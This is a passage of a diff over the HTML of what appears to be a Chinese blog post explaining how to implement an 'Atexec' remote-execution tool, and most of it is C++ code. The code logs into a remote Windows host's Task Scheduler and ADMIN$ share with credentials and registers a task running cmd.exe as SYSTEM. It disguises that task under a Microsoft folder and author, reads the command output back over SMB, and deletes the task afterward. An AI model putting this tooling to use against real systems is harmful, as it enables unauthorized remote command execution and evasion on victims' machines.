 </span></span><span style=display:flex><span>		_variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), <span style=color:#f92672>&amp;</span>pRegistredTask);
 </span></span><span style=display:flex><span>	Sleep(<span style=color:#ae81ff>10</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 结束时删除任务
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
+</span></span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
 </span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>Release();
 </span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>Release();
 </span></span><span style=display:flex><span>	CoUninitialize();
@@ -143,7 +155,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#75715e>// 获取未来10秒后的时间
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>std<span style=color:#f92672>::</span>wstring GetTime() {
+</span></span></span><span style=display:flex><span>std<span style=color:#f92672>::</span>wstring GetTime() {
 </span></span><span style=display:flex><span>	WCHAR CurrentTime[<span style=color:#ae81ff>100</span>];
 </span></span><span style=display:flex><span>	SYSTEMTIME sys;
 </span></span><span style=display:flex><span>	GetLocalTime(<span style=color:#f92672>&amp;</span>sys);
@@ -160,26 +172,26 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span></code></pre></div><p>可以看到，这个函数中针对每个任务创建完成后，等待了大约10s来确保任务计划命令执行完毕，这就是我实现这个Atexec的一个缺点，其实还有更好的办法，就是每隔1s查询该任务计划的状态来确保任务计划执行。</p><h3 id=如何获得执行结果>如何获得执行结果？</h3><p>这里我主要采用的是<code>cmd /c command ></code> 重定向到文件的方式，涉及到了SMB服务的连接、文件读取操作，这个和之前<a href=https://payloads.online/archivers/2020-04-02/1>如何实现一个Psexec</a>文中的内容有些相似。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>DWORD <span style=color:#a6e22e>ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 用于存放SMB共享资源格式
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	PWCHAR lpwsIPC <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> WCHAR[MAX_PATH];
+</span></span></span><span style=display:flex><span>	PWCHAR lpwsIPC <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> WCHAR[MAX_PATH];
 </span></span><span style=display:flex><span>	DWORD dwRetVal; <span style=color:#75715e>// 函数返回值
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	NETRESOURCE nr; <span style=color:#75715e>// 连接的详细信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DWORD dwFlags; <span style=color:#75715e>// 连接选项
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span></span><span style=display:flex><span>	NETRESOURCE nr; <span style=color:#75715e>// 连接的详细信息
+</span></span></span><span style=display:flex><span>	DWORD dwFlags; <span style=color:#75715e>// 连接选项
+</span></span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	ZeroMemory(<span style=color:#f92672>&amp;</span>nr, <span style=color:#66d9ef>sizeof</span>(NETRESOURCE));
 </span></span><span style=display:flex><span>	swprintf(lpwsIPC, TEXT(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>admin$&#34;</span>), lpwsHost);
 </span></span><span style=display:flex><span>	nr.dwType <span style=color:#f92672>=</span> RESOURCETYPE_ANY; <span style=color:#75715e>// 枚举所有资源
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	nr.lpLocalName <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	nr.lpLocalName <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	nr.lpRemoteName <span style=color:#f92672>=</span> lpwsIPC; <span style=color:#75715e>// 资源的网络名
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	nr.lpProvider <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	nr.lpProvider <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	dwFlags <span style=color:#f92672>=</span> CONNECT_UPDATE_PROFILE;
+</span></span></span><span style=display:flex><span>	dwFlags <span style=color:#f92672>=</span> CONNECT_UPDATE_PROFILE;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	dwRetVal <span style=color:#f92672>=</span> WNetAddConnection2(<span style=color:#f92672>&amp;</span>nr, lpwsPassword, lpwsUserName, dwFlags);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (dwRetVal <span style=color:#f92672>==</span> NO_ERROR) {
 </span></span><span style=display:flex><span>		<span style=color:#75715e>// 返回NO_ERROR则成功
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// wprintf(L&#34;Connection added to %s\n&#34;, nr.lpRemoteName);
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#66d9ef>return</span> dwRetVal;
+</span></span></span><span style=display:flex><span>		<span style=color:#75715e>// wprintf(L&#34;Connection added to %s\n&#34;, nr.lpRemoteName);
+</span></span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> dwRetVal;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;WNetAddConnection2 failed with error: %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwRetVal);
@@ -197,7 +209,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取文件大小
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	dwFileSize <span style=color:#f92672>=</span> GetFileSize(hFile, NULL);
+</span></span></span><span style=display:flex><span>	dwFileSize <span style=color:#f92672>=</span> GetFileSize(hFile, NULL);
 </span></span><span style=display:flex><span>	readBuf <span style=color:#f92672>=</span> (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
 </span></span><span style=display:flex><span>	ReadFile(hFile, readBuf, dwFileSize, <span style=color:#f92672>&amp;</span>dwReaded, NULL);
 </span></span><span style=display:flex><span>	wprintf(TEXT(<span style=color:#e6db74>&#34;===========================</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>));
@@ -209,7 +221,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>}
 </span></span></code></pre></div><p>这里默认主要是将命令执行结果写入了ADMIN$共享目录下，当然还可以更改为其他的。</p><h2 id=0x04-atexec完整代码>0x04 Atexec完整代码</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define _WIN32_DCOM
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#define _CRT_SECURE_NO_WARNINGS   </span><span style=color:#75715e>// 忽略老版本函数所提示的安全问题
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;comdef.h&gt;</span><span style=color:#75715e>
@@ -217,13 +229,13 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;time.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;taskschd.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;winnetwk.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;taskschd.lib&#34;)
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;comsupp.lib&#34;)
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;ws2_32&#34;)   
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib, &#34;Mpr.lib&#34;)
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;Advapi32.lib&#34;)
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> <span style=color:#66d9ef>namespace</span> std;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>ITaskService<span style=color:#f92672>*</span> pService <span style=color:#f92672>=</span> NULL;
@@ -232,14 +244,14 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>BOOL <span style=color:#a6e22e>ConnectTaskServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) {
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 初始化COM组件
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoInitializeEx(NULL, COINIT_MULTITHREADED);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoInitializeEx(NULL, COINIT_MULTITHREADED);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置组件安全等级
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoInitializeSecurity(NULL, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, <span style=color:#ae81ff>0</span>, NULL);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoInitializeSecurity(NULL, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, <span style=color:#ae81ff>0</span>, NULL);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务服务容器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pService);
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pService);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 连接目标服务器为远程连接或本地服务器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	hr <span style=color:#f92672>=</span> pService<span style=color:#f92672>-&gt;</span>Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	<span style=color:#75715e>//默认本地
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (FAILED(hr))
+</span></span></span><span style=display:flex><span>	hr <span style=color:#f92672>=</span> pService<span style=color:#f92672>-&gt;</span>Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	<span style=color:#75715e>//默认本地
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (FAILED(hr))
 </span></span><span style=display:flex><span>	{
 </span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;ITaskService::Connect failed: %x </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, hr);
 </span></span><span style=display:flex><span>		
@@ -253,26 +265,26 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>DWORD <span style=color:#a6e22e>ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 用于存放SMB共享资源格式
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	PWCHAR lpwsIPC <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> WCHAR[MAX_PATH];
+</span></span></span><span style=display:flex><span>	PWCHAR lpwsIPC <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> WCHAR[MAX_PATH];
 </span></span><span style=display:flex><span>	DWORD dwRetVal; <span style=color:#75715e>// 函数返回值
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	NETRESOURCE nr; <span style=color:#75715e>// 连接的详细信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	DWORD dwFlags; <span style=color:#75715e>// 连接选项
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span></span><span style=display:flex><span>	NETRESOURCE nr; <span style=color:#75715e>// 连接的详细信息
+</span></span></span><span style=display:flex><span>	DWORD dwFlags; <span style=color:#75715e>// 连接选项
+</span></span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	ZeroMemory(<span style=color:#f92672>&amp;</span>nr, <span style=color:#66d9ef>sizeof</span>(NETRESOURCE));
 </span></span><span style=display:flex><span>	swprintf(lpwsIPC, TEXT(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>admin$&#34;</span>), lpwsHost);
 </span></span><span style=display:flex><span>	nr.dwType <span style=color:#f92672>=</span> RESOURCETYPE_ANY; <span style=color:#75715e>// 枚举所有资源
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	nr.lpLocalName <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	nr.lpLocalName <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	nr.lpRemoteName <span style=color:#f92672>=</span> lpwsIPC; <span style=color:#75715e>// 资源的网络名
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	nr.lpProvider <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	nr.lpProvider <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	dwFlags <span style=color:#f92672>=</span> CONNECT_UPDATE_PROFILE;
+</span></span></span><span style=display:flex><span>	dwFlags <span style=color:#f92672>=</span> CONNECT_UPDATE_PROFILE;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	dwRetVal <span style=color:#f92672>=</span> WNetAddConnection2(<span style=color:#f92672>&amp;</span>nr, lpwsPassword, lpwsUserName, dwFlags);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (dwRetVal <span style=color:#f92672>==</span> NO_ERROR) {
 </span></span><span style=display:flex><span>		<span style=color:#75715e>// 返回NO_ERROR则成功
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75715e>// wprintf(L&#34;Connection added to %s\n&#34;, nr.lpRemoteName);
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#66d9ef>return</span> dwRetVal;
+</span></span></span><span style=display:flex><span>		<span style=color:#75715e>// wprintf(L&#34;Connection added to %s\n&#34;, nr.lpRemoteName);
+</span></span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> dwRetVal;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	wprintf(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;WNetAddConnection2 failed with error: %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwRetVal);
@@ -290,7 +302,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取文件大小
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	dwFileSize <span style=color:#f92672>=</span> GetFileSize(hFile, NULL);
+</span></span></span><span style=display:flex><span>	dwFileSize <span style=color:#f92672>=</span> GetFileSize(hFile, NULL);
 </span></span><span style=display:flex><span>	readBuf <span style=color:#f92672>=</span> (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
 </span></span><span style=display:flex><span>	ReadFile(hFile, readBuf, dwFileSize, <span style=color:#f92672>&amp;</span>dwReaded, NULL);
 </span></span><span style=display:flex><span>	wprintf(TEXT(<span style=color:#e6db74>&#34;===========================</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>));
@@ -302,7 +314,7 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#75715e>// 获取未来10秒后的时间
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>std<span style=color:#f92672>::</span>wstring GetTime() {
+</span></span></span><span style=display:flex><span>std<span style=color:#f92672>::</span>wstring GetTime() {
 </span></span><span style=display:flex><span>	WCHAR CurrentTime[<span style=color:#ae81ff>100</span>];
 </span></span><span style=display:flex><span>	SYSTEMTIME sys;
 </span></span><span style=display:flex><span>	GetLocalTime(<span style=color:#f92672>&amp;</span>sys);
@@ -327,40 +339,40 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>	wstring wstrExePath(TEXT(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>System32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>cmd.exe&#34;</span>));
 </span></span><span style=display:flex><span>	
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 获取任务文件夹并在其中创建任务
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pService<span style=color:#f92672>-&gt;</span>GetFolder(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AppID&#34;</span>), <span style=color:#f92672>&amp;</span>pRootFolder);
+</span></span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>GetFolder(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AppID&#34;</span>), <span style=color:#f92672>&amp;</span>pRootFolder);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 如果存在同名任务，删除它
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
+</span></span></span><span style=display:flex><span>	pRootFolder<span style=color:#f92672>-&gt;</span>DeleteTask(_bstr_t(wTaskName), <span style=color:#ae81ff>0</span>);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 使用ITaskDefinition对象定义任务相关信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITaskDefinition<span style=color:#f92672>*</span> pTask <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITaskDefinition<span style=color:#f92672>*</span> pTask <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pService<span style=color:#f92672>-&gt;</span>NewTask(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>pTask);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 使用IRegistrationInfo对象对任务的基础信息填充
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IRegistrationInfo<span style=color:#f92672>*</span> pRegInfo <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IRegistrationInfo<span style=color:#f92672>*</span> pRegInfo <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_RegistrationInfo(<span style=color:#f92672>&amp;</span>pRegInfo);
 </span></span><span style=display:flex><span>	pRegInfo<span style=color:#f92672>-&gt;</span>put_Author(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Microsoft Corporation&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务的安全凭证
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IPrincipal<span style=color:#f92672>*</span> pPrincipal <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IPrincipal<span style=color:#f92672>*</span> pPrincipal <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Principal(<span style=color:#f92672>&amp;</span>pPrincipal);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置规则为交互式登录
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
+</span></span></span><span style=display:flex><span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	pPrincipal<span style=color:#f92672>-&gt;</span>put_UserId(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;NT AUTHORITY</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>SYSTEM&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务的设置信息
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITaskSettings<span style=color:#f92672>*</span> pTaskSettings <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITaskSettings<span style=color:#f92672>*</span> pTaskSettings <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Settings(<span style=color:#f92672>&amp;</span>pTaskSettings);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 为设置信息赋值
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pTaskSettings<span style=color:#f92672>-&gt;</span>put_StartWhenAvailable(VARIANT_TRUE);
+</span></span></span><span style=display:flex><span>	pTaskSettings<span style=color:#f92672>-&gt;</span>put_StartWhenAvailable(VARIANT_TRUE);
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置任务的idle设置
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IIdleSettings<span style=color:#f92672>*</span> pIdleSettings <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IIdleSettings<span style=color:#f92672>*</span> pIdleSettings <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTaskSettings<span style=color:#f92672>-&gt;</span>get_IdleSettings(<span style=color:#f92672>&amp;</span>pIdleSettings);
 </span></span><span style=display:flex><span>	pIdleSettings<span style=color:#f92672>-&gt;</span>put_WaitTimeout(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;PT1M&#34;</span>));
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#75715e>//创建触发器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITriggerCollection<span style=color:#f92672>*</span> pTriggerCollection <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITriggerCollection<span style=color:#f92672>*</span> pTriggerCollection <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Triggers(<span style=color:#f92672>&amp;</span>pTriggerCollection);
 </span></span><span style=display:flex><span>	ITrigger<span style=color:#f92672>*</span> pTrigger <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>
@@ -374,21 +386,21 @@ Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> FALSE;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 设置时间触发器
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	ITimeTrigger<span style=color:#f92672>*</span> pTimeTrigger <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	ITimeTrigger<span style=color:#f92672>*</span> pTimeTrigger <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTrigger<span style=color:#f92672>-&gt;</span>QueryInterface(IID_ITimeTrigger, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pTimeTrigger);
 </span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_Id(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Trigger2&#34;</span>));
 </span></span><span style=display:flex><span>	CurrentTime <span style=color:#f92672>=</span> GetTime();
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 在10秒后执行
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_StartBoundary(_bstr_t(CurrentTime.data()));
+</span></span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_StartBoundary(_bstr_t(CurrentTime.data()));
 </span></span><span style=display:flex><span>	pTimeTrigger<span style=color:#f92672>-&gt;</span>put_EndBoundary(_bstr_t(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;2089-03-26T13:00:00&#34;</span>));
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 创建任务动作
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	IActionCollection<span style=color:#f92672>*</span> pActionCollection <span style=color:#f92672>=</span> NULL;
+</span></span></span><span style=display:flex><span>	IActionCollection<span style=color:#f92672>*</span> pActionCollection <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pTask<span style=color:#f92672>-&gt;</span>get_Actions(<span style=color:#f92672>&amp;</span>pActionCollection);
 </span></span><span style=display:flex><span>	IAction<span style=color:#f92672>*</span> pAction <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	pActionCollection<span style=color:#f92672>-&gt;</span>Create(TASK_ACTION_EXEC, <span style=color:#f92672>&amp;</span>pAction);
 </span></span><span style=display:flex><span>	IExecAction<span style=color:#f92672>*</span> pExecAction <span style=color:#f92672>=</span> NULL;
 </span></span><span style=display:flex><span>	<span style=color:#75715e>// 出入执行命令及参数
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	pAction<span style=color:#f92672>-&gt;</span>QueryInterface(IID_IExecAction, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pExecAction);
+</span></span></span><span style=display:flex><span>	pAction<span style=color:#f92672>-&gt;</span>QueryInterface(IID_IExecAction, (<span style=color:#66d9ef>void</span><span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>pExecAction);
 </span></span><span style=display:flex><span>	pExecAction<span style=color:#f92672>-&gt;</span>put_Path(_bstr_t(wstrExePath.c_str()));
